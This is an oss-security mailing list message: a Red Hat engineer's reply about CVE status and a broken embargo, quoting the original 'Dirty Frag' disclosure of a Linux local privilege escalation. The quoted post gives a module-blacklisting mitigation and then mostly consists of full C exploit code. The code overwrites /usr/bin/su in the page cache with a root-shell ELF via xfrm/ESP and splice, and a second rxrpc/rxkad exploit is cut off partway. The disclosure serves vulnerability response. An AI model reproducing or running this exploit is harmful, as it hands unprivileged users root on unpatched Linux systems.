Received: (qmail 9525 invoked by uid 550); 7 May 2026 19:17:11 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 24271 invoked from network); 7 May 2026 19:14:28 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
	s=mimecast20190719; t=1778181259;
	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
	 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
	 in-reply-to:in-reply-to:references:references;
	bh=Xdk0Rpi5mbTjGY1qWTd9v/mvXZybBQVf4tGh1k0AGi4=;
	b=L24TrU76ot8UzpLM3Sd3TY5aCt2qc8wYx3FvoOxTGUS/dwFLdERG4ywziYv8Q6hJPhjqqD
	1Y7rB95ePU5H6Zkl1EzB+vgnszSlX+KZQKpFLfctrCfb1rQDOW/FP7yMrL4YjtYNL6Bxba
	OwrprRm2bfTd5dkPkT2lDb+lbMydu/E=
X-MC-Unique: 9I9HKlv_PSS9ygRT3PBFrg-1
X-Mimecast-MFC-AGG-ID: 9I9HKlv_PSS9ygRT3PBFrg_1778181254
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1778181253; x=1778786053;
        h=cc:to:subject:message-id:date:from:in-reply-to:references
         :mime-version:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to;
        bh=FKzAH49ZrKImxJydn0fb5Un3YurQDluqLi84sx/uaN8=;
        b=YGq4iu9R4hQ6fBc6zWRgXK53tri+7C2jLCsAwrsZK54aRY2f51fWglPVeMDt4smKtq
         XBpeHZNPGzsg9UuGvOWdZw/qbeRfd08z7mg+iKGUzvYkaNKyTC1eU1yIzp0SF083buVv
         XlNERITZSrVIQeCRgiquwX5F77mkKRRqnIWi2pV3DLIpR1Qw0h+UL75QJBClB99kqaf5
         hRNecY7FZr0dHl8445fHIacGeeXATCIhFGSMAyCZRib1EIMR+T0lzsSo/QScyHwJgvq+
         IYIiMmAfrToQQPonTl0S3Ct/LfzjNz4IbGOYanLfLdgoyrw3k3lTYmtPG7TOBCtiiPNF
         Whcg==
X-Gm-Message-State: AOJu0Yw0CJoe0nuMZN/zAI+IATSeLqCUx9vuvdfvplyZ/QGu7+ICkUnA
	rcjFaW/nzWUrlAOWXMcKVqUHAbnbkbKuFcdOi5Efd0lEHAComTKIHE34GsbPr/0tgXHW07NEtQP
	j3/YH72X+N1NWkphqT7qLKSqwfF12i8cYi+kU6FGJaIrvZvJdaEYjmEhLWSXfrtY9N0v+ljx54h
	564Y3oLS1u70nsT6GhcTwV5YwknYLCeDlibk51zvYoRQLKzui1HZ25MJI=
X-Gm-Gg: AeBDievxqr+MDmFmS9Po5QzlrUXTsHjBdltcac0PrLMkKKXjBs69B52ffMMelzfKEJU
	+emsVW8C+qjWv43kx0fUk9bFSMRpWmL/ROQasmUu6mPWy641mSFJv4Dl8nWRUkMGzRibN7CYozz
	2AdzAEoj20ow+uNqk0yfsDWruWKgiDA7DJiHnwnAbWAP1jK1RwHPcoVk0W+X2Bn+JHykbmWmCJK
	OhH/Q==
X-Received: by 2002:a05:651c:255a:20b0:393:4e44:63ba with SMTP id 38308e7fff4ca-393c4328139mr29207611fa.29.1778181252845;
        Thu, 07 May 2026 12:14:12 -0700 (PDT)
X-Received: by 2002:a05:651c:255a:20b0:393:4e44:63ba with SMTP id
 38308e7fff4ca-393c4328139mr29207411fa.29.1778181251733; Thu, 07 May 2026
 12:14:11 -0700 (PDT)
MIME-Version: 1.0
References: <afzgS2SCWNcZU3vU@v4bel>
In-Reply-To: <afzgS2SCWNcZU3vU@v4bel>
From: Sandipan Roy <saroy@redhat.com>
Date: Fri, 8 May 2026 00:43:59 +0530
X-Gm-Features: AVHnY4JTJj7e2YT5ij-jA_ArKvs3upXLOQ2PgyIRVd3yy3kEEc2aTciiSO08M9Y
Message-ID: <CAJ33NAVT3SKdcF6LFSnn4zuCUyxnjih0KET_cCTrMmgnhwNPbA@mail.gmail.com>
To: oss-security@lists.openwall.com, cve@kernel.org
Cc: imv4bel@gmail.com
X-Mimecast-Spam-Score: 0
X-Mimecast-MFC-PROC-ID: nr4HfnmEEgLIt13kTcjmvoZ11bLya8z8khTF6ZhNyb4_1778181254
X-Mimecast-Originator: redhat.com
Content-Type: multipart/alternative; boundary="000000000000db298706513f15aa"
Subject: Re: [oss-security] Dirty Frag: Universal Linux LPE

--000000000000db298706513f15aa
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hi,

This stated that =E2=80=9Cno patches or CVEs exist=E2=80=9D because the emb=
argo was broken.
Could you please provide an update on the CVE assignment status for this
issue?

Additionally, could you clarify how the information became public prior to
coordinated disclosure? Understanding the cause of the embargo break would
help us assess the broader impact on downstream response activities.

Thank you,

Sandipan Roy


On Fri, May 8, 2026 at 12:32=E2=80=AFAM Hyunwoo Kim <imv4bel@gmail.com> wro=
te:

> Hi,
>
> This is a report on "Dirty Frag", a universal LPE that allows obtaining
> root privileges on all major distributions.
>
> This vulnerability has a similar impact to the previous Copy Fail.
>
> Because the embargo has now been broken, no patches or CVEs exist for
> these vulnerabilities. After consultation with the
> linux-distros@vs.openwall.org
> maintainers, and at the maintainers' request, I am publicly releasing this
> Dirty Frag document.
>
> As with the previous Copy Fail vulnerability, Dirty Frag likewise allows
> immediate root privilege escalation on all major distributions, and it
> chains two separate vulnerabilities:
>
> -
> https://git.kernel.org/pub/scm/linux/kernel/git/netdev/net.git/commit/?id=
=3Df4c50a4034e62ab75f1d5cdd191dd5f9c77fdff4
> - https://lore.kernel.org/all/afKV2zGR6rrelPC7@v4bel/
>
> Because the responsible disclosure schedule and embargo have been broken,
> no patches exist for any distribution. Use the following command to remove
> the
> modules in which the vulnerabilities occur:
> ```
> sh -c "printf 'install esp4 /bin/false\ninstall esp6 /bin/false\ninstall
> rxrpc /bin/false\n' > /etc/modprobe.d/dirtyfrag.conf; rmmod esp4 esp6 rxr=
pc
> 2>/dev/null; true"
> ```
>
> For detailed technical information about the vulnerabilities and the
> reason the
> embargo was broken, please check https://dirtyfrag.io.
>
> Full exploit code:
> ```c
> #define _GNU_SOURCE
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <stdint.h>
> #include <unistd.h>
> #include <fcntl.h>
> #include <errno.h>
> #include <sched.h>
> #include <sys/syscall.h>
> #include <sys/types.h>
> #include <sys/socket.h>
> #include <sys/uio.h>
> #include <sys/ioctl.h>
> #include <sys/wait.h>
> #include <netinet/in.h>
> #include <arpa/inet.h>
> #include <net/if.h>
> #include <linux/if.h>
> #include <linux/netlink.h>
> #include <linux/rtnetlink.h>
> #include <linux/xfrm.h>
>
> #ifndef UDP_ENCAP
> #define UDP_ENCAP 100
> #endif
> #ifndef UDP_ENCAP_ESPINUDP
> #define UDP_ENCAP_ESPINUDP 2
> #endif
> #ifndef SOL_UDP
> #define SOL_UDP 17
> #endif
>
> #define ENC_PORT         4500
> #define SEQ_VAL          200
> #define REPLAY_SEQ       100
> #define TARGET_PATH      "/usr/bin/su"
> #define PATCH_OFFSET     0              /* overwrite whole ELF starting at
> file[0] */
> #define PAYLOAD_LEN      192            /* bytes of shell_elf to write (48
> triggers) */
> #define ENTRY_OFFSET     0x78           /* shellcode entry inside the new
> ELF */
>
> /*
>  * 192-byte minimal x86_64 root-shell ELF.
>  *   _start at 0x400078:
>  *     setgid(0); setuid(0); setgroups(0, NULL);
>  *     execve("/bin/sh", NULL, ["TERM=3Dxterm", NULL]);
>  *   PT_LOAD covers 0xb8 bytes (the actual content) at vaddr 0x400000 R+X.
>  *
>  *   Setting TERM in the new shell's env silences the
>  *   "tput: No value for $TERM" / "test: : integer expected" noise
>  *   /etc/bash.bashrc and friends emit when TERM is unset.
>  *
>  * Code (from offset 0x78):
>  *   31 ff               xor edi, edi
>  *   31 f6               xor esi, esi
>  *   31 c0               xor eax, eax
>  *   b0 6a               mov al, 0x6a              ; setgid
>  *   0f 05               syscall
>  *   b0 69               mov al, 0x69              ; setuid
>  *   0f 05               syscall
>  *   b0 74               mov al, 0x74              ; setgroups
>  *   0f 05               syscall
>  *   6a 00               push 0                    ; envp[1] =3D NULL
>  *   48 8d 05 12 00 00 00 lea rax, [rip+0x12]      ; rax =3D "TERM=3Dxter=
m"
>  *   50                  push rax                  ; envp[0]
>  *   48 89 e2            mov rdx, rsp              ; rdx =3D envp
>  *   48 8d 3d 12 00 00 00 lea rdi, [rip+0x12]      ; rdi =3D "/bin/sh"
>  *   31 f6               xor esi, esi              ; rsi =3D NULL (argv)
>  *   6a 3b 58            push 0x3b ; pop rax       ; rax =3D 59 (execve)
>  *   0f 05               syscall                   ;
> execve("/bin/sh",NULL,envp)
>  *   "TERM=3Dxterm\0"      (offset 0xa5..0xaf)
>  *   "/bin/sh\0"         (offset 0xb0..0xb7)
>  */
> static const uint8_t shell_elf[PAYLOAD_LEN] =3D {
>
> 0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0=
0,0x00,
>
> 0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x0=
0,0x00,
>
> 0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0=
0,0x00,
>
> 0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x0=
0,0x00,
>
> 0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0=
0,0x00,
>
> 0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x0=
0,0x00,
>
> 0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x0=
0,0x00,
>
> 0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb=
0,0x6a,
>
> 0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x0=
5,0x12,
>
> 0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x3=
1,0xf6,
>
> 0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6=
d,0x00,
>
> 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0=
0,0x00,
> };
>
> extern int g_su_verbose;
> int g_su_verbose =3D 0;
> #define SLOG(fmt, ...) do { if (g_su_verbose) fprintf(stderr, "[su] " fmt
> "\n", ##__VA_ARGS__); } while (0)
>
> static int write_proc(const char *path, const char *buf)
> {
>         int fd =3D open(path, O_WRONLY);
>         if (fd < 0) return -1;
>         int n =3D write(fd, buf, strlen(buf));
>         close(fd);
>         return n;
> }
>
> static void setup_userns_netns(void)
> {
>         uid_t real_uid =3D getuid();
>         gid_t real_gid =3D getgid();
>         if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
>                 SLOG("unshare: %s", strerror(errno));
>                 exit(1);
>         }
>         write_proc("/proc/self/setgroups", "deny");
>         char map[64];
>         snprintf(map, sizeof(map), "0 %u 1", real_uid);
>         if (write_proc("/proc/self/uid_map", map) < 0) {
>                 SLOG("uid_map: %s", strerror(errno)); exit(1);
>         }
>         snprintf(map, sizeof(map), "0 %u 1", real_gid);
>         if (write_proc("/proc/self/gid_map", map) < 0) {
>                 SLOG("gid_map: %s", strerror(errno)); exit(1);
>         }
>         int s =3D socket(AF_INET, SOCK_DGRAM, 0);
>         if (s < 0) { SLOG("socket: %s", strerror(errno)); exit(1); }
>         struct ifreq ifr; memset(&ifr, 0, sizeof(ifr));
>         strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
>         if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) { SLOG("SIOCGIFFLAGS: %s",
> strerror(errno)); exit(1); }
>         ifr.ifr_flags |=3D IFF_UP | IFF_RUNNING;
>         if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0) { SLOG("SIOCSIFFLAGS: %s",
> strerror(errno)); exit(1); }
>         close(s);
> }
>
> static void put_attr(struct nlmsghdr *nlh, int type, const void *data,
> size_t len)
> {
>         struct rtattr *rta =3D (struct rtattr *)((char *)nlh +
> NLMSG_ALIGN(nlh->nlmsg_len));
>         rta->rta_type =3D type;
>         rta->rta_len  =3D RTA_LENGTH(len);
>         memcpy(RTA_DATA(rta), data, len);
>         nlh->nlmsg_len =3D NLMSG_ALIGN(nlh->nlmsg_len) +
> RTA_ALIGN(rta->rta_len);
> }
>
> static int add_xfrm_sa(uint32_t spi, uint32_t patch_seqhi)
> {
>         int sk =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
>         if (sk < 0) return -1;
>         struct sockaddr_nl nl =3D { .nl_family =3D AF_NETLINK };
>         if (bind(sk, (struct sockaddr*)&nl, sizeof(nl)) < 0) { close(sk);
> return -1; }
>
>         char buf[4096] =3D {0};
>         struct nlmsghdr *nlh =3D (struct nlmsghdr *)buf;
>         nlh->nlmsg_type  =3D XFRM_MSG_NEWSA;
>         nlh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK;
>         nlh->nlmsg_pid   =3D getpid();
>         nlh->nlmsg_seq   =3D 1;
>         nlh->nlmsg_len   =3D NLMSG_LENGTH(sizeof(struct xfrm_usersa_info)=
);
>
>         struct xfrm_usersa_info *xs =3D (struct xfrm_usersa_info
> *)NLMSG_DATA(nlh);
>         xs->id.daddr.a4 =3D inet_addr("127.0.0.1");
>         xs->id.spi      =3D htonl(spi);
>         xs->id.proto    =3D IPPROTO_ESP;
>         xs->saddr.a4    =3D inet_addr("127.0.0.1");
>         xs->family      =3D AF_INET;
>         xs->mode        =3D XFRM_MODE_TRANSPORT;
>         xs->replay_window =3D 0;
>         xs->reqid       =3D 0x1234;
>         xs->flags       =3D XFRM_STATE_ESN;
>         xs->lft.soft_byte_limit   =3D (uint64_t)-1;
>         xs->lft.hard_byte_limit   =3D (uint64_t)-1;
>         xs->lft.soft_packet_limit =3D (uint64_t)-1;
>         xs->lft.hard_packet_limit =3D (uint64_t)-1;
>         xs->sel.family  =3D AF_INET;
>         xs->sel.prefixlen_d =3D 32;
>         xs->sel.prefixlen_s =3D 32;
>         xs->sel.daddr.a4 =3D inet_addr("127.0.0.1");
>         xs->sel.saddr.a4 =3D inet_addr("127.0.0.1");
>
>         {
>                 char alg_buf[sizeof(struct xfrm_algo_auth) + 32];
>                 memset(alg_buf, 0, sizeof(alg_buf));
>                 struct xfrm_algo_auth *aa =3D (struct xfrm_algo_auth
> *)alg_buf;
>                 strncpy(aa->alg_name, "hmac(sha256)",
> sizeof(aa->alg_name)-1);
>                 aa->alg_key_len   =3D 32 * 8;
>                 aa->alg_trunc_len =3D 128;
>                 memset(aa->alg_key, 0xAA, 32);
>                 put_attr(nlh, XFRMA_ALG_AUTH_TRUNC, alg_buf,
> sizeof(alg_buf));
>         }
>         {
>                 char alg_buf[sizeof(struct xfrm_algo) + 16];
>                 memset(alg_buf, 0, sizeof(alg_buf));
>                 struct xfrm_algo *ea =3D (struct xfrm_algo *)alg_buf;
>                 strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name)-1);
>                 ea->alg_key_len =3D 16 * 8;
>                 memset(ea->alg_key, 0xBB, 16);
>                 put_attr(nlh, XFRMA_ALG_CRYPT, alg_buf, sizeof(alg_buf));
>         }
>         {
>                 struct xfrm_encap_tmpl enc;
>                 memset(&enc, 0, sizeof(enc));
>                 enc.encap_type  =3D UDP_ENCAP_ESPINUDP;
>                 enc.encap_sport =3D htons(ENC_PORT);
>                 enc.encap_dport =3D htons(ENC_PORT);
>                 enc.encap_oa.a4 =3D 0;
>                 put_attr(nlh, XFRMA_ENCAP, &enc, sizeof(enc));
>         }
>         {
>                 char esn_buf[sizeof(struct xfrm_replay_state_esn) + 4];
>                 memset(esn_buf, 0, sizeof(esn_buf));
>                 struct xfrm_replay_state_esn *esn =3D (struct
> xfrm_replay_state_esn *)esn_buf;
>                 esn->bmp_len       =3D 1;
>                 esn->oseq          =3D 0;
>                 esn->seq           =3D REPLAY_SEQ;
>                 esn->oseq_hi       =3D 0;
>                 esn->seq_hi        =3D patch_seqhi;
>                 esn->replay_window =3D 32;
>                 put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esn_buf,
> sizeof(esn_buf));
>         }
>
>         if (send(sk, nlh, nlh->nlmsg_len, 0) < 0) { close(sk); return -1;=
 }
>         char rbuf[4096];
>         int n =3D recv(sk, rbuf, sizeof(rbuf), 0);
>         if (n < 0) { close(sk); return -1; }
>         struct nlmsghdr *rh =3D (struct nlmsghdr *)rbuf;
>         if (rh->nlmsg_type =3D=3D NLMSG_ERROR) {
>                 struct nlmsgerr *e =3D NLMSG_DATA(rh);
>                 if (e->error) { close(sk); return -1; }
>         }
>         close(sk);
>         return 0;
> }
>
> static int do_one_write(const char *path, off_t offset, uint32_t spi)
> {
>         int sk_recv =3D socket(AF_INET, SOCK_DGRAM, 0);
>         if (sk_recv < 0) return -1;
>         int one =3D 1;
>         setsockopt(sk_recv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
>         struct sockaddr_in sa_d =3D {
>                 .sin_family =3D AF_INET,
>                 .sin_port   =3D htons(ENC_PORT),
>                 .sin_addr   =3D { inet_addr("127.0.0.1") },
>         };
>         if (bind(sk_recv, (struct sockaddr*)&sa_d, sizeof(sa_d)) < 0) {
>                 close(sk_recv); return -1;
>         }
>         int encap =3D UDP_ENCAP_ESPINUDP;
>         if (setsockopt(sk_recv, IPPROTO_UDP, UDP_ENCAP, &encap,
> sizeof(encap)) < 0) {
>                 close(sk_recv); return -1;
>         }
>         int sk_send =3D socket(AF_INET, SOCK_DGRAM, 0);
>         if (sk_send < 0) { close(sk_recv); return -1; }
>         if (connect(sk_send, (struct sockaddr*)&sa_d, sizeof(sa_d)) < 0) {
>                 close(sk_send); close(sk_recv); return -1;
>         }
>         int file_fd =3D open(path, O_RDONLY);
>         if (file_fd < 0) { close(sk_send); close(sk_recv); return -1; }
>
>         int pfd[2];
>         if (pipe(pfd) < 0) { close(file_fd); close(sk_send);
> close(sk_recv); return -1; }
>
>         uint8_t hdr[24];
>         *(uint32_t*)(hdr + 0) =3D htonl(spi);
>         *(uint32_t*)(hdr + 4) =3D htonl(SEQ_VAL);
>         memset(hdr + 8, 0xCC, 16);
>
>         struct iovec iov_h =3D { .iov_base =3D hdr, .iov_len =3D sizeof(h=
dr) };
>         if (vmsplice(pfd[1], &iov_h, 1, 0) !=3D (ssize_t)sizeof(hdr)) {
>                 close(file_fd); close(pfd[0]); close(pfd[1]);
> close(sk_send); close(sk_recv); return -1;
>         }
>         off_t off =3D offset;
>         ssize_t s =3D splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MO=
VE);
>         if (s !=3D 16) {
>                 close(file_fd); close(pfd[0]); close(pfd[1]);
> close(sk_send); close(sk_recv); return -1;
>         }
>         s =3D splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE);
>         /* still proceed regardless of splice rc =E2=80=94 kernel may hav=
e already
>          * decrypted the page in the time between splice and recv */
>         usleep(150 * 1000);
>
>         close(file_fd); close(pfd[0]); close(pfd[1]);
>         close(sk_send); close(sk_recv);
>         return s =3D=3D 40 ? 0 : -1;
> }
>
> static int verify_byte(const char *path, off_t offset, uint8_t want)
> {
>         int fd =3D open(path, O_RDONLY);
>         if (fd < 0) return -1;
>         uint8_t got;
>         if (pread(fd, &got, 1, offset) !=3D 1) { close(fd); return -1; }
>         close(fd);
>         return got =3D=3D want ? 0 : -1;
> }
>
> static int corrupt_su(void)
> {
>         setup_userns_netns();
>         usleep(100 * 1000);
>
>         /* Install 40 xfrm SAs, one per 4-byte chunk.  Each carries the
>          * desired payload word in its seq_hi field. */
>         for (int i =3D 0; i < PAYLOAD_LEN / 4; i++) {
>                 uint32_t spi =3D 0xDEADBE10 + i;
>                 uint32_t seqhi =3D
>                         ((uint32_t)shell_elf[i*4 + 0] << 24) |
>                         ((uint32_t)shell_elf[i*4 + 1] << 16) |
>                         ((uint32_t)shell_elf[i*4 + 2] <<  8) |
>                         ((uint32_t)shell_elf[i*4 + 3]);
>                 if (add_xfrm_sa(spi, seqhi) < 0) {
>                         SLOG("add_xfrm_sa #%d failed", i);
>                         return -1;
>                 }
>         }
>         SLOG("installed %d xfrm SAs", PAYLOAD_LEN / 4);
>
>         for (int i =3D 0; i < PAYLOAD_LEN / 4; i++) {
>                 uint32_t spi =3D 0xDEADBE10 + i;
>                 off_t off =3D PATCH_OFFSET + i * 4;
>                 if (do_one_write(TARGET_PATH, off, spi) < 0) {
>                         SLOG("do_one_write #%d at off=3D0x%lx failed", i,
> (long)off);
>                         return -1;
>                 }
>         }
>         SLOG("wrote %d bytes to %s starting at 0x%x",
>                         PAYLOAD_LEN, TARGET_PATH, PATCH_OFFSET);
>         return 0;
> }
>
> int su_lpe_main(int argc, char **argv)
> {
>         for (int i =3D 1; i < argc; i++) {
>                 if (!strcmp(argv[i], "-v") || !strcmp(argv[i],
> "--verbose"))
>                         g_su_verbose =3D 1;
>                 else if (!strcmp(argv[i], "--corrupt-only"))
>                         ; /* compat: this body always corrupts only */
>         }
>         if (getenv("DIRTYFRAG_VERBOSE")) g_su_verbose =3D 1;
>
>         pid_t cpid =3D fork();
>         if (cpid < 0) return 1;
>         if (cpid =3D=3D 0) {
>                 int rc =3D corrupt_su();
>                 _exit(rc =3D=3D 0 ? 0 : 2);
>         }
>         int cstatus;
>         waitpid(cpid, &cstatus, 0);
>         if (!WIFEXITED(cstatus) || WEXITSTATUS(cstatus) !=3D 0) {
>                 SLOG("corruption stage failed (status=3D0x%x)", cstatus);
>                 return 1;
>         }
>
>         /* Sanity check: bytes at the embedded ELF entry (file offset 0x78
>          * after our overwrite) should be 0x31 0xff (xor edi, edi =E2=80=
=94 first
>          * instruction of the new shellcode). */
>         if (verify_byte(TARGET_PATH, ENTRY_OFFSET, 0x31) !=3D 0 ||
>                         verify_byte(TARGET_PATH, ENTRY_OFFSET + 1, 0xff)
> !=3D 0) {
>                 SLOG("post-write verify failed (target unchanged)");
>                 return 1;
>         }
>         SLOG("/usr/bin/su page-cache patched (entry 0x%x =3D shellcode)",
>                         ENTRY_OFFSET);
>         return 0;
> }
> /*
>  * rxrpc/rxkad LPE =E2=80=94 uid=3D1000 =E2=86=92 root
>  */
>
> #define _GNU_SOURCE
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <stdint.h>
> #include <stdarg.h>
> #include <errno.h>
> #include <unistd.h>
> #include <fcntl.h>
> #include <time.h>
> #include <sched.h>
> #include <poll.h>
> #include <signal.h>
> #include <sys/wait.h>
> #include <sys/socket.h>
> #include <sys/syscall.h>
> #include <sys/uio.h>
> #include <sys/types.h>
> #include <sys/mman.h>
> #include <sys/stat.h>
> #include <sys/ioctl.h>
> #include <netinet/in.h>
> #include <arpa/inet.h>
> #include <linux/rxrpc.h>
> #include <linux/keyctl.h>
> #include <linux/if_alg.h>
> #include <net/if.h>
> #include <termios.h>
>
> #ifndef AF_RXRPC
> #define AF_RXRPC 33
> #endif
> #ifndef PF_RXRPC
> #define PF_RXRPC AF_RXRPC
> #endif
> #ifndef SOL_RXRPC
> #define SOL_RXRPC 272
> #endif
> #ifndef SOL_ALG
> #define SOL_ALG 279
> #endif
> #ifndef AF_ALG
> #define AF_ALG 38
> #endif
> #ifndef MSG_SPLICE_PAGES
> #define MSG_SPLICE_PAGES 0x8000000
> #endif
>
> /* ---- rxrpc constants ---- */
> #define RXRPC_PACKET_TYPE_DATA          1
> #define RXRPC_PACKET_TYPE_ACK           2
> #define RXRPC_PACKET_TYPE_ABORT         4
> #define RXRPC_PACKET_TYPE_CHALLENGE     6
> #define RXRPC_PACKET_TYPE_RESPONSE      7
> #define RXRPC_CLIENT_INITIATED          0x01
> #define RXRPC_REQUEST_ACK               0x02
> #define RXRPC_LAST_PACKET               0x04
> #define RXRPC_CHANNELMASK               3
> #define RXRPC_CIDSHIFT                  2
>
> struct rxrpc_wire_header {
>         uint32_t epoch;
>         uint32_t cid;
>         uint32_t callNumber;
>         uint32_t seq;
>         uint32_t serial;
>         uint8_t  type;
>         uint8_t  flags;
>         uint8_t  userStatus;
>         uint8_t  securityIndex;
>         uint16_t cksum;        /* big-endian on wire */
>         uint16_t serviceId;
> } __attribute__((packed));
>
> struct rxkad_challenge {
>         uint32_t version;
>         uint32_t nonce;
>         uint32_t min_level;
>         uint32_t __padding;
> } __attribute__((packed));
>
> /* Attacker-chosen 8-byte session key used for the rxkad token.
>  * Mutable because the LPE brute-force iterates over keys looking for
>  * one that decrypts the file's UID field to a "0:" prefix. */
> static uint8_t SESSION_KEY[8] =3D {
>         0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08
> };
>
> #define LOG(fmt, ...) fprintf(stderr, "[+] " fmt "\n", ##__VA_ARGS__)
> #define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
> #define DBG(fmt, ...) fprintf(stderr, "[.] " fmt "\n", ##__VA_ARGS__)
>
> /* =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D */
> /* unshare + map setup                                                  */
> /* =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D */
>
> static int write_file(const char *path, const char *fmt, ...)
> {
>         int fd =3D open(path, O_WRONLY);
>         if (fd < 0) return -1;
>         char buf[256]; va_list ap; va_start(ap, fmt);
>         int n =3D vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
>         int r =3D (int)write(fd, buf, n); close(fd);
>         return r;
> }
>
> static int do_unshare_userns_netns(void)
> {
>         uid_t real_uid =3D getuid();
>         gid_t real_gid =3D getgid();
>         if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
>                 WARN("unshare(NEWUSER|NEWNET): %s", strerror(errno));
>                 return -1;
>         }
>         LOG("unshare(USER|NET) OK, real uid=3D%u", real_uid);
>         write_file("/proc/self/setgroups", "deny");
>         if (write_file("/proc/self/uid_map", "%u %u 1", real_uid,
> real_uid) < 0) {
>                 WARN("uid_map: %s", strerror(errno)); return -1;
>         }
>         if (write_file("/proc/self/gid_map", "%u %u 1", real_gid,
> real_gid) < 0) {
>                 WARN("gid_map: %s", strerror(errno)); return -1;
>         }
>         LOG("uid/gid identity-mapped %u/%u; gained CAP_NET_RAW within
> netns",
>                         real_uid, real_gid);
>
>         /* ifup lo */
>         int s =3D socket(AF_INET, SOCK_DGRAM, 0);
>         if (s >=3D 0) {
>                 struct ifreq ifr; memset(&ifr, 0, sizeof(ifr));
>                 strcpy(ifr.ifr_name, "lo");
>                 if (ioctl(s, SIOCGIFFLAGS, &ifr) =3D=3D 0) {
>                         ifr.ifr_flags |=3D IFF_UP | IFF_RUNNING;
>                         if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0)
>                                 WARN("SIOCSIFFLAGS lo: %s",
> strerror(errno));
>                         else
>                                 LOG("lo brought UP in new netns");
>                 }
>                 close(s);
>         }
>         return 0;
> }
>
> /* =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D */
> /* rxrpc key (rxkad v1 token with attacker session key)                 */
> /* =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D */
>
> static long key_add(const char *type, const char *desc,
>                 const void *payload, size_t plen, int ringid)
> {
>         return syscall(SYS_add_key, type, desc, payload, plen, ringid);
> }
>
> static int build_rxrpc_v1_token(uint8_t *out, size_t maxlen)
> {
>         uint8_t *p =3D out;
>         uint32_t now =3D (uint32_t)time(NULL);
>         uint32_t expires =3D now + 86400;
